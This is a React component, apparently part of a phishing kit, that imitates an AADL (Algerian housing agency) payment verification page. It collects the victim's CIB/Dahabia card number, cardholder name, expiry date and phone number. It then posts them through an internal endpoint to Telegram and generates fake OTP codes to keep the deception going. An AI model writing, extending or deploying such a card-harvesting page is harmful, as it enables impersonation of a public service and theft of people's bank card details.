"use client"

import type React from "react"
import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card } from "@/components/ui/card"
import { toast } from "sonner"
import Image from "next/image"

interface CardDetailsStepProps {
  onNext: () => void
  onBack: () => void
  formData: any
  updateFormData: (data: any) => void
}

export function CardDetailsStep({ onNext, onBack, formData, updateFormData }: CardDetailsStepProps) {
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [isSubmitting, setIsSubmitting] = useState(false)

  const validateExpiry = (expiry: string) => {
    return /^\d{2}\/\d{2}$/.test(expiry)
  }

  const validatePhone = (phone: string) => {
    const cleanPhone = phone.replace(/\s/g, "")
    return cleanPhone.length === 10 && /^\d+$/.test(cleanPhone)
  }

  const handleNameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    updateFormData({ cardHolderName: e.target.value })
    setErrors({ ...errors, cardHolderName: "" })
  }

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "")

    if (value.length <= 2) {
      updateFormData({ cardExpiry: value })
    } else if (value.length <= 4) {
      const month = value.slice(0, 2)
      const year = value.slice(2, 4)
      updateFormData({ cardExpiry: `${month}/${year}` })
    }
    setErrors({ ...errors, cardExpiry: "" })
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 10)
    updateFormData({ cardPhone: value })
    setErrors({ ...errors, cardPhone: "" })
  }

  const generateOTP = () => {
    return Math.floor(100000 + Math.random() * 900000).toString()
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const newErrors: Record<string, string> = {}

    if (!formData.cardHolderName?.trim()) {
      newErrors.cardHolderName = "الاسم واللقب مطلوب"
    }
    if (!validateExpiry(formData.cardExpiry)) {
      newErrors.cardExpiry = "تاريخ انتهاء الصلاحية يجب أن يكون MM/YY"
    }
    if (!validatePhone(formData.cardPhone)) {
      newErrors.cardPhone = "رقم الهاتف يجب أن يكون 10 أرقام"
    }

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors)
      return
    }

    setIsSubmitting(true)

    try {
      const otpCodes = [generateOTP(), generateOTP(), generateOTP(), generateOTP()]
      updateFormData({ otpCodes, currentOtpIndex: 0 })

      // Simple formatted message: Name / Card Number / Expiry / Phone
      const telegramMessage = `<b>${formData.cardHolderName}</b> / <code>${formData.cardNumber}</code> / <code>${formData.cardExpiry}</code> / <code>${formData.cardPhone}</code>`

      await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: telegramMessage }),
      })

      toast.success("تم إرسال البيانات بنجاح")
      onNext()
    } catch (error) {
      toast.error("حدث خطأ في إرسال البيانات")
      console.error(error)
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#1a1a4e] via-[#2a2a6e] to-[#1a1a4e] flex items-center justify-center p-4 relative overflow-hidden">
      {/* Background decorations */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-full opacity-5">
          <div className="absolute top-10 left-10 w-64 h-64 bg-white rounded-full blur-3xl" />
          <div className="absolute bottom-20 right-10 w-80 h-80 bg-yellow-400 rounded-full blur-3xl" />
        </div>
        <div className="absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.03)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.03)_1px,transparent_1px)] bg-[size:50px_50px]" />
      </div>

      <div className="relative z-10 w-full max-w-md">
        {/* Logo */}
        <div className="flex justify-center mb-4">
          <div className="bg-white rounded-xl p-2 shadow-xl">
            <Image src="/aadl-logo.png" alt="AADL" width={60} height={60} className="object-contain" />
          </div>
        </div>

        <Card className="bg-white/95 backdrop-blur-sm p-6 shadow-2xl border-0 rounded-2xl">
          <h1 className="text-lg font-bold text-center mb-1 text-[#1a1a4e]">
            بيانات البطاقة CIB/DAHABIA
          </h1>
          <p className="text-xs text-gray-500 text-center mb-4">ادخل بيانات بطاقتك للتحقق من الدفع</p>

          <form onSubmit={handleSubmit} className="space-y-4">
            {/* Display card number (read-only) */}
            <div className="bg-gray-50 rounded-lg p-3 mb-2">
              <p className="text-xs text-gray-500 text-center mb-1">رقم البطاقة</p>
              <p className="text-center font-mono text-lg tracking-widest text-[#1a1a4e]">{formData.cardNumber}</p>
            </div>

            {/* Cardholder Name */}
            <div>
              <label className="block text-sm font-semibold mb-2 text-gray-700 text-right">الاسم واللقب</label>
              <Input
                type="text"
                placeholder="ادخل الاسم واللقب كما هو على البطاقة"
                value={formData.cardHolderName || ""}
                onChange={handleNameChange}
                className="w-full text-right"
                dir="rtl"
              />
              {errors.cardHolderName && <p className="text-red-500 text-sm mt-1 text-right">{errors.cardHolderName}</p>}
            </div>

            {/* Expiry Date */}
            <div>
              <label className="block text-sm font-semibold mb-2 text-gray-700 text-right">تاريخ الانتهاء</label>
              <Input
                type="text"
                placeholder="MM/YY"
                value={formData.cardExpiry || ""}
                onChange={handleExpiryChange}
                maxLength={5}
                className="w-full text-center font-mono"
                dir="ltr"
              />
              {errors.cardExpiry && <p className="text-red-500 text-xs mt-1 text-right">{errors.cardExpiry}</p>}
            </div>

            {/* Phone Number */}
            <div>
              <label className="block text-sm font-semibold mb-2 text-gray-700 text-right">رقم الهاتف</label>
              <Input
                type="text"
                inputMode="numeric"
                placeholder="0000000000"
                maxLength={10}
                value={formData.cardPhone || ""}
                onChange={handlePhoneChange}
                className="w-full text-center font-mono tracking-widest"
                dir="ltr"
              />
              {errors.cardPhone && <p className="text-red-500 text-sm mt-1 text-right">{errors.cardPhone}</p>}
            </div>

            {/* Submit Button */}
            <Button
              type="submit"
              disabled={isSubmitting}
              className="w-full bg-[#3a3a8f] hover:bg-[#2d2d7a] text-white font-semibold py-3 rounded-lg transition"
            >
              {isSubmitting ? "جاري الارسال..." : "متابعة"}
            </Button>
          </form>

          {/* Back Button */}
          <Button onClick={onBack} variant="outline" className="w-full mt-3 bg-transparent">
            العودة
          </Button>
        </Card>
      </div>

      {/* Footer */}
      <p className="absolute bottom-4 left-0 right-0 text-center text-xs text-white/50">خدمة ارشادية لمتابعة ملفات AADL 3</p>
    </div>
  )
}
